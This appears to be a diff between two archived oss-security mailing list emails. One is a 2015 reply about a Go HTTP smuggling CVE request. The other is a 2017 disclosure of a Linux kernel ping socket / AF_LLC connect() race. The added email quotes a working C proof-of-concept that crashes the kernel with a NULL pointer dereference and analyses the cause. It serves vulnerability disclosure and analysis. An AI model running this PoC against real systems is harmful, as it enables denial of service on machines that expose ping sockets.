@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["712" "Wednesday" "29" "July" "2015" "21:16:52" "+0200" "Florian Weimer" "fweimer@redhat.com" "<55B926A4.2020601@redhat.com>" "18" "Re: [oss-security] CVE Request - Go net/http library - HTTP smuggling" nil nil nil "7" "2015072919:16:52" "[oss-security] CVE Request - Go net/http library - HTTP smuggling" (number mark "        fweimer@redh Jul 29   18/712   " thread-indent "\"Re: [oss-security] CVE Request - Go net/http library - HTTP smuggling\"\n") "<CA+s3sfH-k=1RQtuEqST-2NB7XrEZZv1QYwxNdG6TuDz_A5ruVA@mail.gmail.com>" ("<CA+s3sfH-k=1RQtuEqST-2NB7XrEZZv1QYwxNdG6TuDz_A5ruVA@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["2496" "Friday" "24" "March" "2017" "21:27:14" "+0100" "Solar Designer" "solar@openwall.com" "<20170324202714.GA29241@openwall.com>" "72" "[oss-security] Linux kernel ping socket / AF_LLC connect() sin_family race" "^Cc:" nil nil "3" "2017032420:27:14" "[oss-security] Linux kernel ping socket / AF_LLC connect() sin_family race" (number mark "        solar@openwa Mar 24   72/2496  " thread-indent "\"[oss-security] Linux kernel ping socket / AF_LLC connect() sin_family race\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0001
 X-Mozilla-Status2: 00000000
-Received: (qmail 30297 invoked by uid 550); 29 Jul 2015 19:17:08 -0000
+Received: (qmail 30294 invoked by uid 550); 24 Mar 2017 20:29:18 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,38 +11,88 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 30267 invoked from network); 29 Jul 2015 19:17:07 -0000
-References: <CA+s3sfH-k=1RQtuEqST-2NB7XrEZZv1QYwxNdG6TuDz_A5ruVA@mail.gmail.com>
-Message-ID: <55B926A4.2020601@redhat.com>
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101
- Thunderbird/38.1.0
-MIME-Version: 1.0
-In-Reply-To: <CA+s3sfH-k=1RQtuEqST-2NB7XrEZZv1QYwxNdG6TuDz_A5ruVA@mail.gmail.com>
-Content-Type: text/plain; charset=utf-8
-Content-Transfer-Encoding: 7bit
-X-Scanned-By: MIMEDefang 2.68 on 10.5.11.23
-Cc: oss-security@lists.openwall.com
-Date: Wed, 29 Jul 2015 21:16:52 +0200
-From: Florian Weimer <fweimer@redhat.com>
+Received: (qmail 28645 invoked from network); 24 Mar 2017 20:27:37 -0000
+Message-ID: <20170324202714.GA29241@openwall.com>
+Mime-Version: 1.0
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
+User-Agent: Mutt/1.4.2.3i
+Cc: Vasily Kulikov <segoon@openwall.com>
+Date: Fri, 24 Mar 2017 21:27:14 +0100
+From: Solar Designer <solar@openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Subject: Re: [oss-security] CVE Request - Go net/http library - HTTP smuggling
-To: jbuberel@google.com
+Subject: [oss-security] Linux kernel ping socket / AF_LLC connect() sin_family race
+To: oss-security@lists.openwall.com
 
-On 07/29/2015 05:15 PM, Jason Buberel wrote:
-> Hello OSS Security Community,
-> 
-> The Go open source project has received notification of an HTTP request
-> smuggling vulnerability in the net/http library (
-> http://golang.org/pkg/net/http/). The vulnerability was identified in the
-> 1.4.2 release version (http://golang.org/dl) and in the 1.5 release branch.
+Hi,
 
-How does one report such things?
+I haven't fully investigated this issue, and the Subject is provisional
+(but will probably get stuck).  I am not yet sure which kernel
+subsystem(s) to blame here (ping sockets? LLC sockets? other/more?), and
+there might be other ways to trigger the issue.
 
-Due to lack of published security contact information, I contacted the
-de-facto subsystem maintainer about the issue, but I have been ignored.
+Just off Twitter:
 
-(It would be nice to be able to bundle such security updates as far as
-possible, to avoid recompiling everything constantly.)
+https://twitter.com/danieljiang0415/status/845116665184497664
 
--- 
-Florian Weimer / Red Hat Product Security
+daniel_jiang
+@danieljiang0415
+google won't fix kernel crash bug, I release the poc now.
+https://github.com/danieljiang0415/android_kernel_crash_poc
+
+And the PoC is:
+
+---
+#include <stdio.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <stdlib.h>
+static int sockfd = 0;
+static struct sockaddr_in addr = {0};
+
+void fuzz(void * param){
+    while(1){
+        addr.sin_family = 0;//rand()%42;
+        printf("sin_family1 = %08lx\n", addr.sin_family);
+        connect(sockfd, (struct sockaddr *)&addr, 16);
+    }
+}
+int main(int argc, char **argv)
+{
+    sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);
+    int thrd;
+    pthread_create(&thrd, NULL, fuzz, NULL);
+    while(1){
+        addr.sin_family = 0x1a;//rand()%42;
+        addr.sin_port = 0;
+        addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
+        connect(sockfd, (struct sockaddr *)&addr, 16);
+        addr.sin_family = 0;
+    }
+    return 0;
+}
+---
+
+I suppose the focus on Android is because it makes ping sockets
+available to users by default, but the bug isn't Android-specific.
+
+By granting ping sockets to a user, I am able to crash a RHEL7'ish
+system with the above PoC quickly.  The crash (at least in my two tests)
+is a NULL pointer dereference in net/ipv4/ping.c: ping_v4_unhash().
+In newer upstream code, e.g. Linux 4.10.5, the function is renamed to
+ping_unhash() since it's shared with IPv6, but is otherwise similar.
+
+The two address families used by the PoC above are AF_UNSPEC and AF_LLC.
+For the latter, net/llc/af_llc.c: llc_ui_connect() checks for AF_LLC and
+then proceeds to overwrite parts of the "struct sockaddr".
+llc_ui_bind() looks similar, so the issue might also be triggerable via
+bind().  These overwrites might be directly related to the crash, or it
+might be something further.  At first glance, these two functions look
+similar in RHEL7 and 4.10.5, so, if relevant, can probably be used to
+trigger the issue on latest upstream as well.
+
+At this point, I think I'll leave further investigation to someone more
+up-to-date on these interfaces and conventions.  I am merely conveying
+the message, which at this point I understand only partially.
+
+Alexander
